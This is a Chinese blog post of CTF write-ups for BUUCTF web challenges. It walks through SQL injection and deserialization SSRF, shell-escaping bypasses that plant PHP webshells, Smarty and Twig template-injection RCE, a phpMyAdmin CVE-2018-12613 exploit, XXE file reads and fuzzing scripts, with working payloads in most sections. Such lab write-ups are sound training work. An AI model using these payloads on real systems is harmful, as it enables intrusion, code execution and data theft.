---
title: "BUUCTF Web Writeup 3"
date: 2022-08-27T23:53:19+08:00
lastmod: 2022-08-27T23:53:19+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

BUUCTF 刷题记录... (第2页上)

<!--more-->

## [网鼎杯 2018]Fakebook

这题挺尴尬的.... 一开始直接 load_file() 读出源码和 flag 了

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251031271.png)

robots.txt

```
User-agent: *
Disallow: /user.php.bak
```

下载 user.php.bak

```php
<?php

class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

看起来是 ssrf

继续看主页, 登录框和注册框都没有注入

注册时可以填写 blog

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251034220.png)

尝试直接写 `file:///var/www/html/flag.php` 提示 blog is not valid

换成 `https://www.baidu.com` 注册成功

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251035895.png)

点开后右键

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251035207.png)

base64 解码的内容刚好是百度的 html 源码

url 地址如下

```
http://9bc3b55a-fc52-4df4-93b7-080bf0dbc873.node4.buuoj.cn:81/view.php?no=1
```

测试之后发现存在 sql 注入

```
http://9bc3b55a-fc52-4df4-93b7-080bf0dbc873.node4.buuoj.cn:81/view.php?no=1 union select 1,2,3,4
```

提示 `no hack ~_~`

union 和 select 之间多加一个空格就能绕过了, `/**/` 也可以

```
http://9bc3b55a-fc52-4df4-93b7-080bf0dbc873.node4.buuoj.cn:81/view.php?no=-1 union  select 1,2,3,4
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251038677.png)

报错信息里有 unserialize(), 猜测可能对 sql 查询的某个结果进行了反序列化

继续注入看看

```
http://9bc3b55a-fc52-4df4-93b7-080bf0dbc873.node4.buuoj.cn:81/view.php?no=-1 union  select 1,group_concat(no,',',username,',',passwd,',',data),3,4 from users
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251043444.png)

data 里是序列化后的个人信息, 结合之前得到的 user.php.bak 文件

思路应该是通过反序列化构造一个 ssrf, 然后利用 file:// 协议读取本地的 flag.php

不过注册的时候输入不了除 http https 之外的协议, 所以只能从这个 sql 注入下手

payload

```php
<?php

class UserInfo
{
    public $name = "1";
    public $age = 1;
    public $blog = "file:///var/www/html/flag.php";

}

echo serialize(new UserInfo());
```

利用 union 的特性

```
http://9bc3b55a-fc52-4df4-93b7-080bf0dbc873.node4.buuoj.cn:81/view.php?no=-1 union  select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251046930.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251046785.png)

## [RoarCTF 2019]Easy Java

java 的题

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251053743.png)

admin admin888 登录

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251054075.png)

主页右键查看源代码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251054434.png)

访问

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251054645.png)

??? 换了好几个目录也是 file not found

看了一下 wp 发现要把 get 转成 post...

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251055094.png)

help.docx

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251055470.png)

搜了一下 java 的任意文件下载漏洞, 有一种利用方式是读取 `WEB-INF/web.xml`

> WEB-INF 的基本构成
>
> **/WEB-INF/web.xml** Web 应用程序配置文件, 描述了 servlet 和其它的应用组件配置及命名规则
>
> **/WEB-INF/classes/** 包含了站点所用的 class 文件, 包括 servlet class 和非 servlet class
>
> **/WEB-INF/lib** 存放 Web 应用需要的各种 jar 文件
>
> **/WEB-INF/src** 源码目录, 按照包名结构放置各个 java 文件
>
> **/WEB-INF/database.properties** 数据库配置文件
>
> ......

详解 [https://www.cnblogs.com/shamo89/p/9948707.html](https://www.cnblogs.com/shamo89/p/9948707.html)

我们下载 WEB-INF/web.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

    <welcome-file-list>
        <welcome-file>Index</welcome-file>
    </welcome-file-list>

    <servlet>
        <servlet-name>IndexController</servlet-name>
        <servlet-class>com.wm.ctf.IndexController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>IndexController</servlet-name>
        <url-pattern>/Index</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>LoginController</servlet-name>
        <servlet-class>com.wm.ctf.LoginController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>LoginController</servlet-name>
        <url-pattern>/Login</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>DownloadController</servlet-name>
        <servlet-class>com.wm.ctf.DownloadController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>DownloadController</servlet-name>
        <url-pattern>/Download</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>FlagController</servlet-name>
        <servlet-class>com.wm.ctf.FlagController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>FlagController</servlet-name>
        <url-pattern>/Flag</url-pattern>
    </servlet-mapping>

</web-app>
```

发现了 FlagController, 对应的 class 名是 com.wm.ctf.FlagController

```
filename=WEB-INF/classes/com/wm/ctf/FlagController.class
```

下载之后用 jd-gui 打开

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251103004.png)

base64 解码得到 flag

## [BUUCTF 2018]Online Tool

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

之前了解过一些, escapeshellarg 和 escapeshellcmd 同时使用可以绕过过滤进行命令执行

参考文章 [https://paper.seebug.org/164/](https://paper.seebug.org/164/)https://www.php.net/manual/zh/function.escapeshellcmd.php)

win 下测试这两个函数的效果跟 linux 不太一样... 只能手动转义了

> escapeshellarg() 会在单引号之前加上 `\`, 并在被转义的单引号两边和整个字符串两边加上单引号
>
> escapeshellcmd() 会在所有的 `\` 前加上 `\`, 形成 `\\`, 并在**不成对**的单引号前加 `\`

```php
123 -> '123' -> '123' # 正常效果
    
123' -> '123'\''' -> '123'\\''\' # 最后一个引号不成对, 被转义

123'' -> '123'\'''\''' -> '123'\\'''\\''' # 所有引号成对, 不转义

'123' -> ''\''123'\''' -> ''\\''123'\\''' # 所有引号成对, 不转义
```

觉得有点绕的可以打开 linux 自己 echo 字符串试一下

nmap 的 `-oG` 功能可以把输出导出到文件中, 我们利用这个功能来写文件

因为如果用 `>` 的话, 是跳不出去单引号的, escapeshellarg 和 escapeshellcmd 共用绕过的本质是他俩对单引号转义的规则不同

```php
123 -oG 456 -> '123 -oG 456' -> '123 -oG 456' # 正常效果
    
123 -oG 456' -> '123 -oG 456'\''' -> '123 -oG 456'\\''\' # 最后一个引号不成对, 被转义

123 -oG 456'' -> '123 -oG 456'\'''\''' -> '123 -oG 456'\\'''\\''' # 所有引号成对, 不转义

'123 -oG 456' -> ''\''123 -oG 456'\''' -> ''\\''123 -oG 456'\\''' # 所有引号成对, 不转义
```

最终 payload 如下

```
?host='<?php eval($_REQUEST[1])?> -oG a.php '
```

注意 a.php 后要有一个空格, 如果不加空格的话, 第二次转义过后生成的 `'\\'''` 会和文件名连在一起, 最终写入的文件名会变成 `a.php\\`

这题网上**很多 wp**都在说最开头的引号后面要加空格, 例如 `?host=' <?php eval($_REQUEST[1])?> -oG a.php '`, 但实际上不用加空格也能够成功写入

不加空格的话文件里的 php 代码就会变成这样

```php
\\<?php eval($_REQUEST[1]);?>
```

前面的 `\\` 对 php 解析是完全没有影响的, 只是看起来像把 `<` 给转义成 `\<` 了

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251606019.png)

## [BJDCTF2020]The mystery of ip

hint.php 里有一句 `<!-- Do you know why i know your ip? -->`

第一时间想到的是 xff 头伪造 ip

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251633032.png)

试了好几个 ip 地址都不行, 看了 wp 才知道是 smarty 模板注入

不过还是很好奇怎么和模板注入联系上的...

参考文章

[https://www.anquanke.com/post/id/272393](https://www.anquanke.com/post/id/272393)

[https://xz.aliyun.com/t/11108](https://xz.aliyun.com/t/11108)

这题的 smarty 没有开安全模式, 通过 `{}` 直接就能执行 PHP 代码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251635938.png)

## [网鼎杯 2020 朱雀组]phpweb

抓包内容如下

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251707318.png)

func 随便改一个值

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251707672.png)

调用了 call_user_func

show_source 被过滤了, 换成 highlight_file 读取源码, file_get_contents 也行

```php
<?php
$disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
function gettime($func, $p) {
    $result = call_user_func($func, $p);
    $a= gettype($result);
    if ($a == "string") {
        return $result;
    } else {return "";}
}
class Test {
    var $p = "Y-m-d h:i:s a";
    var $func = "date";
    function __destruct() {
        if ($this->func != "") {
            echo gettime($this->func, $this->p);
        }
    }
}
$func = $_REQUEST["func"];
$p = $_REQUEST["p"];

if ($func != null) {
    $func = strtolower($func);
    if (!in_array($func,$disable_fun)) {
        echo gettime($func, $p);
    }else {
        die("Hacker...");
    }
}
?>
```

有一个 Test 类, 猜测是反序列化

通过 `__destruct` 执行命令可以绕过检测, 而刚好 unserialize 没有被过滤

payload 如下

```
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251707093.png)
## [GXYCTF2019]禁止套娃


![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251748275.png)

试了一堆目录和文件, 试出来 .git 目录

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251749578.png)

index.php

```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```

`/[a-z,_]+\((?R)?\)/` 匹配的是类似于 `a(b(c()))` 的字符串, 要求替换之后的字符串全等于 `;`

也就是说 payload 格式只能是 `a(b(c()));`

明显利用的是无参数函数读文件 / rce 这个 trick

payload 如下

```
http://d02232b5-2e11-4816-99b5-03bac9959236.node4.buuoj.cn:81/
?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251751557.png)

## [BJDCTF2020]ZJCTF，不过如此

```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```

看着好熟悉

```
http://0c7c25eb-0cf1-48a3-9275-3e974778839f.node4.buuoj.cn:81/?text=data://text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php
```

next.php

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```

主要考察 preg_replace 中 `/e` 修饰符导致的代码执行, 以及 PHP 的可变变量

参考文章

[https://xz.aliyun.com/t/2557](https://xz.aliyun.com/t/2557)

[https://www.php.net/manual/zh/language.variables.variable.php](https://www.php.net/manual/zh/language.variables.variable.php)

payload 如下, 没用到 getFlag 这个函数, 非要用的话思路也差不多

```
http://0c7c25eb-0cf1-48a3-9275-3e974778839f.node4.buuoj.cn:81/next.php?\S*={${eval($_REQUEST[1])}}&1=system('cat /flag');
```

因为 PHP get 参数名中的 `.` 会被转换成 `_`, 所以不能用 `.*` 这个正则

`\S` 表示匹配任意非空白符的字符, `*` 表示重复零次或更多次

另外不太清楚 `{${phpinfo()}}` 为什么最外层还要加一组大括号, 可能是这个原因?

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251851177.png)

## [BSidesCF 2020]Had a bad day

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208251912700.png)

猜测是文件包含

category 改成 index.php 提示 `Sorry, we currently only support woofers and meowers.`

根据经验来看应该只是单纯 strpos 查看有没有包含这个关键词

php://filter 遇到不认识的过滤器会自动跳过

测试一下发现末尾会自动加 `.php`

```
http://0a37d3e1-1235-4537-a0e0-a2a8318129e0.node4.buuoj.cn:81/index.php?category=php://filter/meowers/convert.base64-encode/resource=index
```

index.php

```php
......
<?php
$file = $_GET['category'];

if(isset($file))
{
	if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
		include ($file . '.php');
	}
	else{
		echo "Sorry, we currently only support woofers and meowers.";
	}
}
?>
......
```

好像不用加关键词也能包含成功...

存在 /flag.php 直接包含

```
http://0a37d3e1-1235-4537-a0e0-a2a8318129e0.node4.buuoj.cn:81/index.php?category=php://filter/meowers/convert.base64-encode/resource=flag
```

或者利用目录穿越 `resource=meowers/../flag`

## [GWCTF 2019]我有一个数据库

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208252035124.png)

robots.txt

```
User-agent: *
Disallow: phpinfo.php
```

phpinfo 没看出来什么, 倒是看一半的时候想着会不会有 phpmyadmin

访问 /phpmyadmin

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208252036677.png)

test 用户, 读写文件都不行, 不过发现 phpmyadmin 的版本才只有 4.8.1

网上搜了一下相关的漏洞

[https://www.cnblogs.com/liliyuanshangcao/p/13815242.html](https://www.cnblogs.com/liliyuanshangcao/p/13815242.html)

我用的是 CVE-2018-12613

首先将 sql 查询写入 session

```
select '<?php eval($_REQUEST[1]);?>';
```

然后包含文件, session id 就是 cookie 中 phpMyAdmin 的值

```
http://9125f90e-533c-4fa5-9158-a49652793cd7.node4.buuoj.cn:81/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_83jpjerdqkvmrn2t4nhv3r1j5n&1=system('cat /flag');
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208252040999.png)

好像不支持 post 提交, 只能用 get

## [BJDCTF2020]Mark loves cat

.git 泄露

index.php

```php
......
<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}

echo "the flag is: ".$flag;
```

??? 有点乱, 随便传了个参就得到 flag 了

```
http://42c649fb-b7ef-49f6-9761-40c7b31f6a84.node4.buuoj.cn:81/?yds=flag
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208252104793.png)

另一种方法

```
http://42c649fb-b7ef-49f6-9761-40c7b31f6a84.node4.buuoj.cn:81/?is=flag&flag=flag
```

## [NCTF2019]Fake XML cookbook

常规 xxe

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [
<!ENTITY file SYSTEM "file:///flag">]>
<user>
    <username>
        &file;
    </username>
    <password>
        123
    </password>
</user>
```

其中 username 是回显位

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208271920255.png)

## [安洵杯 2019]easy_web

url 如下

```
http://fceb2d5a-0801-4f14-8892-7320f73f2268.node4.buuoj.cn:81/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&cmd=
```

img 有点可疑, base64 解码两次 (第一次解码记得在末尾加上 `=`)

```
3535352e706e67
```

hex 编码, 再解码的内容为 `555.png`

看起来是文件包含, 于是构造了 index.php, 读取出来的内容 base64 解密一次即可

```php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
```

上半段没啥可利用的, 下半段一开始以为是 md5 数组绕过, 结果发现一直不行

原因是 `(string)$_POST['a'] !== (string)$_POST['b']` 这一句, 任何数组转换成 string 类型的值都是 Array, 也就无法利用了

搜了一下发现考点是 md5 碰撞, 利用 fastcoll 生成两个 md5 值一样的二进制文件

[https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip](https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip)

```
C:\Users\46224\Desktop\Tools>fastcoll_v1.0.0.5.exe
MD5 collision generator v1.5
by Marc Stevens (http://www.win.tue.nl/hashclash/)

Allowed options:
  -h [ --help ]           Show options.
  -q [ --quiet ]          Be less verbose.
  -i [ --ihv ] arg        Use specified initial value. Default is MD5 initial
                          value.
  -p [ --prefixfile ] arg Calculate initial value using given prefixfile. Also
                          copies data to output files.
  -o [ --out ] arg        Set output filenames. This must be the last option
                          and exactly 2 filenames must be specified.
                          Default: -o msg1.bin msg2.bin


C:\Users\46224\Desktop\Tools>fastcoll_v1.0.0.5.exe -o 1 2
MD5 collision generator v1.5
by Marc Stevens (http://www.win.tue.nl/hashclash/)

Using output filenames: '1' and '2'
Using initial value: 0123456789abcdeffedcba9876543210

Generating first block: .......
Generating second block: S00.......
Running time: 1.072 s

C:\Users\46224\Desktop\Tools>
```

burp parse from file 然后对所有字符进行 url 编码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208262201514.png)

strings 可以绕过过滤, 另外 tar gz 这些打包的命令也能用

## [强网杯 2019]高明的黑客

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208262304372.png)

下载 `www.tar.gz`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208262305315.png)

???

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208262305794.png)

里面的代码都是混淆过的, 可阅读性几乎为 0

实在搞不懂要干什么, 看到 wp 才知道是要拿出文件里面的 get 和 post 参数进行 fuzz, 挺无语的...

我是把源代码都放在本地的服务器上, 这样子 fuzz 的时候会快一点

```python
import os
import re
import requests

filenames = os.listdir('.')

url = 'http://127.0.0.1/src/'

def req(filename, getParams, postParams):
    params = {k : 'echo XZXZTEST' for k in getParams}
    data = {k : 'echo XZXZTEST' for k in postParams}
    res = requests.post(url + filename, params=params, data=data)
    if r'XZXZTEST' in res.text:
        print(url + filename,params,data)
        exit()

for filename in filenames:
    if filename != 'search.py':
        with open(filename, 'r') as f:
            text = f.read()
        getParams = re.findall(r"\$\_GET\['(.*?)'\]", text)
        postParams = re.findall(r"\$\_POST\['(.*?)'\]", text)
        print('testing',filename)
        # print(getParams, postParams)
        req(filename, getParams, postParams)
```

先把每个文件里的 get post 参数匹配出来, 然后全部一次性提交试一遍, 找出来文件是什么

跑了大概三四分钟, 显示的是`xk0SzyKwfzw.php`

然后再把这个文件单独拿出来, 用另一个脚本跑, 这次挨个挨个试看是哪一个参数引起的命令执行

```python
import re
import requests

url = 'http://127.0.0.1/src/xk0SzyKwfzw.php'

with open('xk0SzyKwfzw.php', 'r') as f:
    text = f.read()

getParams = re.findall(r"\$\_GET\['(.*?)'\]", text)
postParams = re.findall(r"\$\_POST\['(.*?)'\]", text)

for get in getParams:
    params = {get : 'echo XZXZTEST'}
    res = requests.get(url, params=params)
    if 'XZXZTEST' in res.text:
        print('get',params)

for post in postParams:
    data = {post: 'echo XZXZTEST'}
    res = requests.post(url, data=data)
    if 'XZXZTEST' in res.text:
        print('post',data)
```

跑出来结果是 `Efa5BVG` 这个参数

最后在题目网站里访问查看 flag

```
http://322b2b43-4388-4229-ac9a-4ae3a393ed7a.node4.buuoj.cn:81/xk0SzyKwfzw.php?Efa5BVG=cat /flag
```

 ![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208262311461.png)

页面爆了 Warning, 也可以利用这个思路把 assert 对应的参数试出来, 方法不止一种

## [BJDCTF2020]Cookie is so stable

flag.php 处输入用户名

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208271958544.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208271958886.png)

Hello 后面没有显示了, 把 cookie 删掉试试?

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208271958486.png)

返回头里面有 set-cookie

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208271959964.png)

两个 cookie 都设置一下后返回 Hello 123

尝试把 cookie 中的 user 改成 `{{7*7}}`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208272000115.png)

存在 ssti, 之后通过下图判断对应的模板引擎

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208271928979.png)

`{{7*'7'}}` 返回 Hello 49, 而且是 PHP 语言, 只能是 Twig 了

参考文章 [https://xz.aliyun.com/t/10056](https://xz.aliyun.com/t/10056)

发现 Twig 的版本是 1.x, 关于 `_self` 变量的 payload 直接就能用

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208272006908.png)

利用 exec 执行的时候好像只能返回一行, 用 for endfor 循环没成功, 不过读 flag 没有影响

想要多行都显示的话改成 system 再执行命令就行了

## [WUSTCTF2020]朴实无华

robots.txt

```
User-agent: *
Disallow: /fAke_f1agggg.php
```

访问 fAke_f1agggg.php

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208272352732.png)

访问 fl4g.php

```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?>
```

首先是 intval 的绕过, 这次的绕过有点意思

因为 intval 对科学计数法会截断处理, 例如 `123e456` 会变成 123 (PHP 5)

但是运算的时候, 科学计数法会先转换为数字参与运算, 之后再被 intval

```php
intval('123e1'); // 123
intval('123e1' + 1); // 1230 + 1 = 1231
intval('123e4' + 1); // 1230000 + 1 = 1230001
```

传入 `num=2019e1` 就能绕过了

然后是 md5 的碰撞, 一开始还以为是要找一个两次加密都是 0e 开头的值, 后来才发现并不是那么简单, 0e 后面必须全是数字才行

```python
from hashlib import md5

i = 0

while True:
    a = '0e' + str(i)
    m = md5(a.encode()).hexdigest()
    print(i)
    if m[:2] == '0e' and m[2:].isdigit():
        print('OK!!!!!!!!!1',a)
        break
    i += 1
```

耗时比较长, 出来的结果是 `0e215962017`

最后命令执行的绕过就很简单了

```
http://178bbba8-cd71-4046-b787-e861e97280ac.node4.buuoj.cn:81/fl4g.php?num=2019e1&md5=0e215962017&get_flag=tac${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
```
